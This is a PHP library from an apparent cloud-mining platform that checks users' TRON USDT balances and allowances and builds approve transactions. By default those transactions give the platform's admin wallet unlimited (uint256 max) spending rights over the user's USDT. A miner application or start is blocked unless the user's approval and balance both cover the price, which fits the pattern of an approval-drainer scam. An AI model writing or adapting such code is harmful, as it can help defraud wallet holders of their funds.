<?php

namespace app\common\library;

use GuzzleHttp\Client;
use think\Config;

/**
 * TRON 链上 USDT (TRC20) 授权与余额查询
 */
class HecTron
{
    public static function config()
    {
        return Config::get('hec.tron') ?: [];
    }

    public static function adminWallet()
    {
        $fromSite = trim((string)Config::get('site.admin_wallet', ''));
        if ($fromSite !== '') {
            return $fromSite;
        }
        return trim((string)(self::config()['admin_wallet'] ?? ''));
    }

    /** @deprecated 请使用 usdtContract() */
    public static function usdcContract()
    {
        return self::usdtContract();
    }

    public static function usdtContract()
    {
        return trim((string)(self::config()['usdt_contract'] ?? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'));
    }

    public static function tokenDecimals()
    {
        return (int)(self::config()['token_decimals'] ?? 6);
    }

    public static function trongridApiKey()
    {
        return trim((string)(self::config()['trongrid_api_key'] ?? ''));
    }

    public static function trongridHeaders()
    {
        $key = self::trongridApiKey();
        if ($key === '') {
            return [];
        }
        return ['TRON-PRO-API-KEY' => $key];
    }

    /** 将人类可读金额转为链上最小单位（默认 6 位小数） */
    public static function priceToRaw($amount)
    {
        $amount = trim((string)$amount);
        if ($amount === '' || !is_numeric($amount)) {
            return '0';
        }
        $decimals = self::tokenDecimals();
        $scale = bcpow('10', (string)$decimals, 0);
        if (function_exists('bcmul')) {
            return bcmul($amount, $scale, 0);
        }
        return (string)round((float)$amount * (10 ** $decimals));
    }

    /** 链上最小单位转人类可读金额 */
    public static function rawToAmount($raw)
    {
        $raw = trim((string)$raw);
        if ($raw === '') {
            return '0';
        }
        $decimals = self::tokenDecimals();
        $scale = bcpow('10', (string)$decimals, 0);
        if (function_exists('bcdiv')) {
            return rtrim(rtrim(bcdiv($raw, $scale, $decimals), '0'), '.');
        }
        return (string)((float)$raw / (10 ** $decimals));
    }

    /**
     * 检测钱包是否满足申请矿机：USDT 授权额度 + USDT 余额均须 >= 矿机价格
     *
     * @return array{eligible:bool,requiredAmount:string,allowance:string,allowanceOk:bool,usdtBalance:string,balanceOk:bool,message:string,messages:string[]}
     */
    public static function buildMinerEligibility($owner, $price, $purpose = '申请矿机')
    {
        $purpose = trim((string)$purpose) ?: '申请矿机';
        $owner = trim((string)$owner);
        $requiredRaw = self::priceToRaw($price);
        $requiredAmount = self::rawToAmount($requiredRaw);
        $spender = self::adminWallet();
        $result = [
            'eligible'       => false,
            'requiredAmount' => $requiredAmount,
            'allowance'      => '0',
            'allowanceOk'    => false,
            'usdtBalance'    => '0',
            'balanceOk'      => false,
            'message'        => '',
            'messages'       => [],
        ];

        if (!$owner || !self::isTronAddress($owner)) {
            $result['message'] = '请先连接 TRON 钱包';
            $result['messages'][] = $result['message'];
            return $result;
        }
        if (!$spender || !self::isTronAddress($spender)) {
            $result['message'] = '平台收款钱包未配置';
            $result['messages'][] = $result['message'];
            return $result;
        }
        if (bccomp($requiredRaw, '0', 0) <= 0) {
            $result['eligible'] = true;
            return $result;
        }

        try {
            $result['allowance'] = self::fetchAllowance($owner, $spender);
            $result['allowanceOk'] = bccomp($result['allowance'], $requiredRaw, 0) >= 0;
            if (!$result['allowanceOk']) {
                $msg = sprintf(
                    'USDT 授权额度不足，%s需要 %s USDT，当前授权额度 %s USDT',
                    $purpose,
                    $requiredAmount,
                    self::rawToAmount($result['allowance'])
                );
                $result['messages'][] = $msg;
            }
        } catch (\Throwable $e) {
            $msg = '无法查询 USDT 授权额度，请稍后重试';
            $result['messages'][] = $msg;
        }

        try {
            $result['usdtBalance'] = self::fetchTokenBalance($owner, self::usdtContract());
            $result['balanceOk'] = bccomp($result['usdtBalance'], $requiredRaw, 0) >= 0;
            if (!$result['balanceOk']) {
                $msg = sprintf(
                    '钱包 USDT 余额不足，%s需要 %s USDT，当前余额 %s USDT',
                    $purpose,
                    $requiredAmount,
                    self::rawToAmount($result['usdtBalance'])
                );
                $result['messages'][] = $msg;
            }
        } catch (\Throwable $e) {
            $msg = '无法查询钱包 USDT 余额，请稍后重试';
            $result['messages'][] = $msg;
        }

        $result['eligible'] = $result['allowanceOk'] && $result['balanceOk'];
        $result['message'] = $result['eligible'] ? '' : implode('；', $result['messages']);
        return $result;
    }

    /** @throws \think\Exception */
    public static function assertMinerApplyEligible($owner, $price, $purpose = '申请矿机')
    {
        $check = self::buildMinerEligibility($owner, $price, $purpose);
        if (!$check['eligible']) {
            $fallback = $purpose === '启动矿机' ? '钱包额度或余额不足，无法启动矿机' : '钱包额度或余额不足，无法申请矿机';
            throw new \think\Exception($check['message'] ?: $fallback);
        }
    }

    /** 最低有效授权额度（USDT 6 位小数，默认 1 USDT） */
    public static function minAllowanceRaw()
    {
        return (string)(self::config()['min_allowance'] ?? '1000000');
    }

    public static function isTronAddress($address)
    {
        return (bool)preg_match('/^T[1-9A-HJ-NP-Za-km-z]{33}$/', (string)$address);
    }

    public static function hasValidApprove($owner)
    {
        $owner = trim((string)$owner);
        $spender = self::adminWallet();
        if (!$owner || !self::isTronAddress($owner) || !$spender || !self::isTronAddress($spender)) {
            return false;
        }
        try {
            $allowance = self::fetchAllowance($owner, $spender);
            return function_exists('bccomp')
                ? bccomp($allowance, self::minAllowanceRaw()) >= 0
                : (float)$allowance >= (float)self::minAllowanceRaw();
        } catch (\Throwable $e) {
            return false;
        }
    }

    /**
     * 授权交易上链后 TronGrid 可能有延迟，轮询等待有效授权
     */
    public static function waitForValidApprove($owner, $maxAttempts = 10, $intervalMs = 2000)
    {
        $owner = trim((string)$owner);
        if ($owner === '') {
            return false;
        }
        for ($i = 0; $i < $maxAttempts; $i++) {
            if (self::hasValidApprove($owner)) {
                return true;
            }
            if ($i < $maxAttempts - 1) {
                usleep($intervalMs * 1000);
            }
        }
        return self::hasValidApprove($owner);
    }

    /** 构建授权校验失败时的可读说明 */
    public static function describeApproveFailure($owner)
    {
        $owner = trim((string)$owner);
        $spender = self::adminWallet();
        if (!$owner || !self::isTronAddress($owner)) {
            return '请先连接有效的 TRON 钱包';
        }
        if (!$spender || !self::isTronAddress($spender)) {
            return '平台收款钱包未配置，请联系管理员';
        }

        $allowanceRaw = '0';
        $balanceRaw = '0';
        try {
            $allowanceRaw = self::fetchAllowance($owner, $spender);
        } catch (\Throwable $e) {
            return '无法查询链上授权额度，请稍后重试';
        }
        try {
            $balanceRaw = self::fetchTokenBalance($owner, self::usdtContract());
        } catch (\Throwable $e) {
            // 余额查询失败时仍返回授权信息
        }

        $allowanceUsdt = self::rawToAmount($allowanceRaw);
        $balanceUsdt = self::rawToAmount($balanceRaw);
        $minUsdt = self::rawToAmount(self::minAllowanceRaw());

        return sprintf(
            '链上未检测到对平台地址的有效 USDT 授权。您的钱包：%s；应授权给：%s；当前授权额度：%s USDT（至少需要 %s USDT）；钱包 USDT 余额：%s。请确认在 TRON 主网对 USDT(TRC20) 完成 approve，且授权地址与弹窗中「授权对象」一致。',
            $owner,
            $spender,
            $allowanceUsdt,
            $minUsdt,
            $balanceUsdt
        );
    }

    public static function fetchAllowance($owner, $spender)
    {
        $contract = self::usdtContract();
        if (!self::isTronAddress($owner) || !self::isTronAddress($spender) || !self::isTronAddress($contract)) {
            throw new \InvalidArgumentException('无效的 TRON 地址');
        }

        $parameter = self::encodeAddressParam($owner) . self::encodeAddressParam($spender);
        return self::callConstantContract($contract, 'allowance(address,address)', $parameter, $owner);
    }

    public static function fetchTokenBalance($owner, $contract)
    {
        if (!self::isTronAddress($owner) || !self::isTronAddress($contract)) {
            throw new \InvalidArgumentException('无效的 TRON 地址');
        }

        $parameter = self::encodeAddressParam($owner);
        return self::callConstantContract($contract, 'balanceOf(address)', $parameter, $owner);
    }

    protected static function callConstantContract($contract, $selector, $parameter, $caller)
    {
        $client = new Client(['timeout' => 12, 'http_errors' => false]);
        $response = $client->post('https://api.trongrid.io/wallet/triggerconstantcontract', [
            'headers' => self::trongridHeaders(),
            'json' => [
                'owner_address'     => $caller,
                'contract_address'  => $contract,
                'function_selector' => $selector,
                'parameter'         => $parameter,
                'visible'           => true,
            ],
        ]);

        $body = json_decode((string)$response->getBody(), true);
        if (!is_array($body)) {
            throw new \RuntimeException('TronGrid 响应无效');
        }
        if (!empty($body['result']['message'])) {
            $msg = is_string($body['result']['message'])
                ? $body['result']['message']
                : json_encode($body['result']['message']);
            throw new \RuntimeException('TronGrid 查询失败: ' . $msg);
        }

        $hex = $body['constant_result'][0] ?? '';
        if ($hex === '') {
            return '0';
        }

        if (function_exists('gmp_init')) {
            return gmp_strval(gmp_init($hex, 16), 10);
        }
        if (function_exists('bcadd')) {
            return self::hexToDec($hex);
        }
        return (string)hexdec(substr($hex, -16));
    }

    protected static function encodeAddressParam($base58Address)
    {
        $hex = self::base58ToHex($base58Address);
        if ($hex === '') {
            throw new \InvalidArgumentException('地址解码失败');
        }
        $addr20 = substr($hex, 2);
        return str_pad(strtolower($addr20), 64, '0', STR_PAD_LEFT);
    }

    protected static function base58ToHex($address)
    {
        $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        if (function_exists('gmp_init')) {
            $num = gmp_init(0);
            for ($i = 0, $len = strlen($address); $i < $len; $i++) {
                $pos = strpos($alphabet, $address[$i]);
                if ($pos === false) {
                    return '';
                }
                $num = gmp_add(gmp_mul($num, 58), $pos);
            }
            $hex = gmp_strval($num, 16);
        } else {
            $num = '0';
            for ($i = 0, $len = strlen($address); $i < $len; $i++) {
                $pos = strpos($alphabet, $address[$i]);
                if ($pos === false) {
                    return '';
                }
                $num = bcmul($num, '58', 0);
                $num = bcadd($num, (string)$pos, 0);
            }
            $hex = '';
            while (bccomp($num, '0') > 0) {
                $rem = bcmod($num, '16');
                $hex = dechex((int)$rem) . $hex;
                $num = bcdiv($num, '16', 0);
            }
        }

        if (strlen($hex) % 2) {
            $hex = '0' . $hex;
        }
        for ($i = 0; $i < strlen($address) && $address[$i] === '1'; $i++) {
            $hex = '00' . $hex;
        }
        if (strlen($hex) < 8) {
            return '';
        }
        return substr($hex, 0, -8);
    }

    protected static function hexToDec($hex)
    {
        $hex = ltrim(strtolower($hex), '0');
        if ($hex === '') {
            return '0';
        }
        if (function_exists('gmp_init')) {
            return gmp_strval(gmp_init($hex, 16), 10);
        }
        $dec = '0';
        $len = strlen($hex);
        for ($i = 0; $i < $len; $i++) {
            $dec = bcmul($dec, '16', 0);
            $dec = bcadd($dec, (string)hexdec($hex[$i]), 0);
        }
        return $dec;
    }

  /** approve 无限额度（uint256 max） */
    public static function maxApproveAmountRaw()
    {
        return '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    }

    protected static function encodeUint256Param($decimal)
    {
        $decimal = trim((string)$decimal);
        if ($decimal === '') {
            return str_repeat('0', 64);
        }
        if (function_exists('gmp_init')) {
            $hex = gmp_strval(gmp_init($decimal, 10), 16);
        } else {
            $hex = '';
            $num = $decimal;
            while (bccomp($num, '0') > 0) {
                $rem = bcmod($num, '16');
                $hex = dechex((int)$rem) . $hex;
                $num = bcdiv($num, '16', 0);
            }
            if ($hex === '') {
                $hex = '0';
            }
        }
        return str_pad(strtolower($hex), 64, '0', STR_PAD_LEFT);
    }

    /** 构建 TRC20 USDT approve 未签名交易（服务端 TronGrid，避免浏览器 429） */
    public static function buildApproveTransaction($owner, $spender, $amountRaw = null)
    {
        $owner = trim((string)$owner);
        $spender = trim((string)$spender);
        if (!self::isTronAddress($owner) || !self::isTronAddress($spender)) {
            throw new \InvalidArgumentException('无效的 TRON 地址');
        }

        $amountRaw = $amountRaw !== null ? trim((string)$amountRaw) : self::maxApproveAmountRaw();
        $parameter = self::encodeAddressParam($spender) . self::encodeUint256Param($amountRaw);
        $host = rtrim(trim((string)(self::config()['full_host'] ?? 'https://api.trongrid.io')), '/');

        $client = new Client(['timeout' => 15, 'http_errors' => false]);
        $response = $client->post($host . '/wallet/triggersmartcontract', [
            'headers' => self::trongridHeaders(),
            'json'  => [
                'owner_address'     => $owner,
                'contract_address'  => self::usdtContract(),
                'function_selector' => 'approve(address,uint256)',
                'parameter'         => $parameter,
                'fee_limit'         => 200000000,
                'call_value'        => 0,
                'visible'           => true,
            ],
        ]);

        $body = json_decode((string)$response->getBody(), true);
        if (!is_array($body) || empty($body['transaction']) || !is_array($body['transaction'])) {
            $msg = '构建 approve 交易失败';
            if (!empty($body['result']['message'])) {
                $raw = $body['result']['message'];
                $msg = is_string($raw) && preg_match('/^[0-9a-fA-F]+$/', $raw) ? @hex2bin($raw) : (string)$raw;
            } elseif (!empty($body['Error'])) {
                $msg = (string)$body['Error'];
            }
            throw new \RuntimeException($msg ?: '构建 approve 交易失败');
        }

        return $body['transaction'];
    }

    /** TRX 余额（SUN，1 TRX = 1e6 SUN） */
    public static function fetchTrxBalanceSun($owner)
    {
        $owner = trim((string)$owner);
        if (!self::isTronAddress($owner)) {
            return '0';
        }

        $host = rtrim(trim((string)(self::config()['full_host'] ?? 'https://api.trongrid.io')), '/');
        $client = new Client(['timeout' => 12, 'http_errors' => false]);
        $response = $client->post($host . '/wallet/getaccount', [
            'headers' => self::trongridHeaders(),
            'json'  => [
                'address' => $owner,
                'visible' => true,
            ],
        ]);

        $body = json_decode((string)$response->getBody(), true);
        if (!is_array($body)) {
            return '0';
        }
        return (string)($body['balance'] ?? 0);
    }
}
